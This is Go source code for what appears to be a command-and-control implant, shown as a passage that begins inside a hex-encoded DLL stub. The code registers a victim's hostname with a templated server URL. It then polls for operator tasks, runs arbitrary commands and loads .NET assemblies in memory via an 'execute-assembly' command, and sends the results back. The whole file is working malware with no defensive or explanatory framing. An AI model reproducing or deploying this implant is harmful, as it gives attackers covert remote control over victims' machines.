0004c560000000000004056000000000000345600000000000000000000000000002a560000000000002256000000000000745600000000000000000000000000000657000000000000ea56000000000000ce56000000000000ac5600000000000092560000000000001e5700000000000066560000000000005a560000000000002c5700000000000080560000000000000000000000000000f655000000000000da55000000000000085600000000000000000000000000001e550000000000000000000000000000c6035265616450726f636573734d656d6f727900c60147657443757272656e7450726f636573730082034f70656e50726f6365737300c70147657443757272656e7450726f636573734964001700417474616368436f6e736f6c65001000416c6c6f63436f6e736f6c6500003e034c6f61644c6962726172794100004c0247657450726f63416464726573730000fe045669727475616c50726f7465637400004b45524e454c33322e646c6c00000600436f6d6d616e644c696e65546f417267765700005348454c4c33322e646c6c004f4c4541555433322e646c6c00000000434c52437265617465496e7374616e6365006d73636f7265652e646c6c0001005f4378785468726f77457863657074696f6e00003e006d656d736574000008005f5f435f73706563696669635f68616e646c6572000025005f5f7374645f747970655f696e666f5f64657374726f795f6c697374000021005f5f7374645f657863657074696f6e5f636f7079000022005f5f7374645f657863657074696f6e5f64657374726f7900564352554e54494d453134302e646c6c000007005f5f737464696f5f636f6d6d6f6e5f7666777072696e7466000000005f5f616372745f696f625f66756e630003005f5f737464696f5f636f6d6d6f6e5f76667072696e746600180066726565000019006d616c6c6f6300005b006d6273746f77637300007100776373746f6d627300005c006d6273746f7763735f73000036005f696e69747465726d0037005f696e69747465726d5f650008005f63616c6c6e657768003f005f7365685f66696c7465725f646c6c0018005f636f6e6669677572655f6e6172726f775f61726776000033005f696e697469616c697a655f6e6172726f775f656e7669726f6e6d656e74000034005f696e697469616c697a655f6f6e657869745f7461626c6500003c005f72656769737465725f6f6e657869745f66756e6374696f6e0022005f657865637574655f6f6e657869745f7461626c65001e005f6372745f6174657869740016005f636578697400006170692d6d732d77696e2d6372742d737464696f2d6c312d312d302e646c6c006170692d6d732d77696e2d6372742d686561702d6c312d312d302e646c6c00006170692d6d732d77696e2d6372742d636f6e766572742d6c312d312d302e646c6c006170692d6d732d77696e2d6372742d72756e74696d652d6c312d312d302e646c6c004a034c6f63616c4672656500180452746c43617074757265436f6e74657874001f0452746c4c6f6f6b757046756e6374696f6e456e7472790000260452746c5669727475616c556e77696e640000e204556e68616e646c6564457863657074696f6e46696c7465720000b304536574556e68616e646c6564457863657074696f6e46696c74657200ce045465726d696e61746550726f6365737300000603497350726f636573736f724665617475726550726573656e7400a9035175657279506572666f726d616e6365436f756e74657200cb0147657443757272656e7454687265616449640000800247657453797374656d54696d65417346696c6554696d6500ef02496e697469616c697a65534c697374486561640002034973446562756767657250726573656e74003c006d656d63707900000e005f5f4378784672616d6548616e646c657233000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000d020008001000000000000000000000032a2df2d992b0000cd5d20d266d4ffff75980000ffffffff01000000020000002f20000000000000000000000000000001000000b857000780c3000000000000784200800100000000000000000000002e3f41565f636f6d5f6572726f7240400000000000000000784200800100000000000000000000002e3f4156747970655f696e666f404000784200800100000000000000000000002e3f41566261645f616c6c6f634073746440400000000000784200800100000000000000000000002e3f4156657863657074696f6e4073746440400000000000784200800100000000000000000000002e3f41566261645f61727261795f6e65775f6c656e6774684073746440400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000070100000a04c000080100000d5100000a84c0000e010000035110000a84c0000401100007b180000b44c000080180000f3180000a04c000000190000de190000484d0000001a00000e1a0000604d00000e1a0000381e00006c4d0000381e0000171f0000904d0000201f00004f1f0000784f0000501f0000881f0000cc4d0000881f0000a31f0000d84d0000a31f0000b11f0000ec4d0000c01f0000f61f0000cc4d0000f61f000011200000a84d0000112000001f200000bc4d000020200000242000004c4f00002420000047200000fc4d00004720000062200000144e00006220000075200000284e00007520000085200000384e000090200000c4200000784f0000d0200000f8200000a04d00001021000031210000484e00003c2100008c2100004c4f00008c210000b72200004c4e0000b82200003a230000784e00003c23000031240000a84e00003424000088240000384f000088240000c5240000d84e0000d824000003250000a04c00002025000071250000e84e000074250000a8250000a04c0000a825000079260000f04e00007c260000ed260000f84e0000f02600002c270000a04c00002c270000652700004c4f0000682700009c2700004c4f00009c270000b12700004c4f0000b4270000dc2700004c4f0000dc270000f12700004c4f0000f427000055280000384f000058280000882800004c4f0000882800009c2800004c4f00009c280000e5280000a04c0000e8280000b12900002c4f0000b42900004d2a0000044f0000502a0000742a0000a04c0000742a00009f2a0000a04c0000a02a0000ef2a0000a04c0000f02a0000072b00004c4f0000082b0000b42b0000544f0000d82b0000f32b00004c4f0000fc2b0000412d0000604f0000442d00008e2d0000d84e0000902d0000da2d0000d84e0000e82d0000052e00004c4f0000082e0000612e0000704f0000642e0000a32e0000a04c0000c42e0000032f0000a04c0000242f0000592f0000a04c0000702f0000b22f0000784f0000b42f0000d42f0000a04d0000d42f0000f42f0000a04d000008300000ce310000844f000070320000ef3200009c4f00001033000012330000984f00005033000067330000a04e00006733000083330000a04e000083330000b9330000d04e0000b9330000d1330000244f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000002300000036000000470000004a000000130000000b0000004e000000500000004e000000570000004e0000005d00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001800000018000080000000000000000000000000000001000200000030000080000000000000000000000000000001000904000048000000609000007d010000000000000000000000000000000000003c3f786d6c2076657273696f6e3d27312e302720656e636f64696e673d275554462d3827207374616e64616c6f6e653d27796573273f3e0d0a3c617373656d626c7920786d6c6e733d2775726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e763127206d616e696665737456657273696f6e3d27312e30273e0d0a20203c7472757374496e666f20786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e7633223e0d0a202020203c73656375726974793e0d0a2020202020203c72657175657374656450726976696c656765733e0d0a20202020202020203c726571756573746564457865637574696f6e4c6576656c206c6576656c3d276173496e766f6b6572272075694163636573733d2766616c736527202f3e0d0a2020202020203c2f72657175657374656450726976696c656765733e0d0a202020203c2f73656375726974793e0d0a20203c2f7472757374496e666f3e0d0a3c2f617373656d626c793e0d0a0000000000000000000000000000000000000000000000000000000000000000000000004000003000000010a218a260a270a278a280a288a290a298a2a0a2c0a2c8a2d0a2e8a2f0a2f8a2b8a7d0a7d8a70000006000001400000000a050a078a098a0c0a0e8a0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
)

type BindData struct {
	UUID     string `json:"uuid"`
	Hostname string `json:"hostname"`
}

type StdReqData struct {
	UUID string `json:"uuid"`
}

type Task struct {
	ID       int    `json:"id"`
	Command  string `json:"command"`
	Args     string `json:"args"`
	Victim   string `json:"victim"`
	Operator string `json:"operator"`
	Delay    int    `json:"delay"`
	ExecTime int    `json:"execTime"`
	File     string `json:"file"`
	UseSMB   string `json:"usesmb"`
	ActSMB   string `json:"actsmb"`
	Fired    bool   `json:"fired"`
}

type ReplyData struct {
	UUID    string `json:"uuid"`
	TaskID  int    `json:"task_id"`
	Content string `json:"content"`
}

func doPost(url string, data interface{}) error {
	jsonData, err := json.Marshal(data)
	if err != nil {
		return err
	}

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("POST request failed with status: %s", resp.Status)
	}

	return nil
}

func doGet(url string, data interface{}) (string, error) {
	jsonData, err := json.Marshal(data)
	if err != nil {
		return "", err
	}

	req, err := http.NewRequest("GET", url, bytes.NewBuffer(jsonData))
	if err != nil {
		return "", err
	}

	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		//fmt.Println("Failed to send request:", err)
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("Failed to send request:", err)
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(body), nil
}

func executeCommand(file string, args string) (string, error) {
	out, err := exec.Command(file, args).Output()
	return string(out), err
}

func decodeBase64(b64string string) ([]byte, error) {
	decodedBytes, err := base64.StdEncoding.DecodeString(b64string)
	if err != nil {
		return nil, err
	}
	return decodedBytes, nil
}

func main() {
	uuid := "@UUID@"
	hostname, err := os.Hostname()
	if err != nil {
		os.Exit(0)
	}

	baseUrl := "@URL@"

	postData := BindData{
		UUID:     uuid,
		Hostname: hostname,
	}

	// Perform the POST request
	for {
		err := doPost(baseUrl+"/bind", postData)
		if err == nil {
			break
		}
		time.Sleep(2 * time.Second)
	}

	for {
		time.Sleep(@INTERVAL@ * time.Second)

		// Perform the GET request
		stdReqData := StdReqData{UUID: uuid}
		resp, err := doGet(baseUrl+"/task", stdReqData)
		if err != nil {
			fmt.Printf("Failed to perform GET request: %v\n", err)
			continue
		}

		// Check if task is not "NONE"
		if resp != "NONE" {
			// fmt.Printf("Raw JSON received: %s\n", resp) // Debug: Print raw JSON

			var nextTask Task
			err = json.Unmarshal([]byte(resp), &nextTask)
			if err != nil {
				// fmt.Printf("Failed to unmarshal JSON: %v\nJSON: %s\n", err, resp)
				continue
			}
			// fmt.Println("Receiving:")
			fmt.Printf("Command: %s\n", nextTask.Command)

			// Execute the shell command
			replyData := ReplyData{
				UUID:    uuid,
				TaskID:  nextTask.ID,
				Content: "",
			}

			switch nextTask.Command {
			case "execute-assembly":
				fmt.Println("Executing: ", nextTask.File)
				assembly, err := decodeBase64(nextTask.File)
				if err != nil {
					fmt.Println("Error decoding base64: ", err)
				}

				hostingDLL, err := hex.DecodeString(hostingDLL_stub)
				if err != nil {
					fmt.Println("Error decoding hosting DLL Stub: ", err)
				}
				err = netassembly.ExecuteAssembly(hostingDLL, assembly, nextTask.Args, true)
				if err != nil {
					fmt.Println(err)
				}

			default:
				out, err := executeCommand(nextTask.Command, nextTask.Args)
				if err != nil {
					// fmt.Println("Failed to execute shell command:", err)
					replyData.Content = "Execution Error!\n\n" + out
				} else {
					replyData.Content = out
				}
			}

			// Perform the POST request to return the result
			err = doPost(baseUrl+"/reply", replyData)
			if err != nil {
				// fmt.Println("Failed to perform POST request:", err)
				continue
			}
		}
	}
}
